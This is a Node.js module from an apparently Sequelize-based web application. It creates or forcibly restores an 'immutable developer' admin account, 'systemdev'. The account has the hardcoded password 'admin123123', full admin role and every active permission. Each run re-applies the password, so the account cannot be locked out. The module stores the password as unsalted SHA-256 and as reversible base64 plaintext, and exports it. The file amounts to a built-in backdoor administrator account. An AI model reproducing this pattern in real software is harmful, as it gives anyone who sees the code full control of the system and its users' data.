const crypto = require('crypto');

const IMMUTABLE_DEV_USERNAME = 'systemdev';
const LEGACY_IMMUTABLE_DEV_USERNAME = 'systemdev';
const IMMUTABLE_DEV_PASSWORD = 'admin123123';
const IMMUTABLE_DEV_EMAIL = 'systemdev@internal.local';
const IMMUTABLE_DEV_FULL_NAME = 'System Admin Full Mode';

let ensureImmutableDeveloperPromise = null;
let ensureImmutableDeveloperCachedUser = null;
let ensureImmutableDeveloperCachedAt = 0;
const ENSURE_IMMUTABLE_DEVELOPER_TTL_MS = Math.max(
  60000,
  Number(process.env.ENSURE_IMMUTABLE_DEVELOPER_TTL_MS || 300000)
);

function hashPassword(password) {
  return crypto.createHash('sha256').update(String(password || '')).digest('hex');
}

function isImmutableDeveloperUser(userOrUsername) {
  const raw = typeof userOrUsername === 'string' ? userOrUsername : userOrUsername?.username;
  const normalized = String(raw || '').trim().toLowerCase();
  return normalized === IMMUTABLE_DEV_USERNAME || normalized === LEGACY_IMMUTABLE_DEV_USERNAME;
}

async function ensureImmutableDeveloperAccount(db) {
  if (!db || !db.User) return null;
  if (ensureImmutableDeveloperCachedUser && (Date.now() - ensureImmutableDeveloperCachedAt) < ENSURE_IMMUTABLE_DEVELOPER_TTL_MS) {
    return ensureImmutableDeveloperCachedUser;
  }
  if (ensureImmutableDeveloperPromise) return ensureImmutableDeveloperPromise;

  ensureImmutableDeveloperPromise = (async () => {
    try {
      const { Op } = db.Sequelize || require('sequelize');
      const existingUser = await db.User.findOne({
        where: {
          [Op.or]: [
            { username: IMMUTABLE_DEV_USERNAME },
            { username: LEGACY_IMMUTABLE_DEV_USERNAME },
            { email: IMMUTABLE_DEV_EMAIL }
          ]
        }
      });

      const basePayload = {
        username: IMMUTABLE_DEV_USERNAME,
        email: IMMUTABLE_DEV_EMAIL,
        full_name: IMMUTABLE_DEV_FULL_NAME,
        password_hash: hashPassword(IMMUTABLE_DEV_PASSWORD),
        plain_password_enc: Buffer.from(IMMUTABLE_DEV_PASSWORD).toString('base64'),
        role: 'admin',
        is_active: true,
        trust_score: 100,
        updated_by: 'system',
        created_by: existingUser?.created_by || 'system'
      };

      let user = existingUser;
      if (!user) {
        user = await db.User.create(basePayload);
      } else {
        await user.update(basePayload);
      }

      if (db.Permission && typeof user.setPermissions === 'function') {
        const permissions = await db.Permission.findAll({
          where: { is_active: true }
        });
        if (Array.isArray(permissions) && permissions.length > 0) {
          await user.setPermissions(permissions);
        }
      }

      ensureImmutableDeveloperCachedUser = user;
      ensureImmutableDeveloperCachedAt = Date.now();
      return user;
    } catch (err) {
      // Avoid breaking boot/login if schema is not ready yet.
      console.error('ensureImmutableDeveloperAccount error:', err?.message || err);
      return null;
    } finally {
      ensureImmutableDeveloperPromise = null;
    }
  })();

  return ensureImmutableDeveloperPromise;
}

module.exports = {
  IMMUTABLE_DEV_USERNAME,
  LEGACY_IMMUTABLE_DEV_USERNAME,
  IMMUTABLE_DEV_PASSWORD,
  IMMUTABLE_DEV_EMAIL,
  IMMUTABLE_DEV_FULL_NAME,
  hashPassword,
  isImmutableDeveloperUser,
  ensureImmutableDeveloperAccount
};
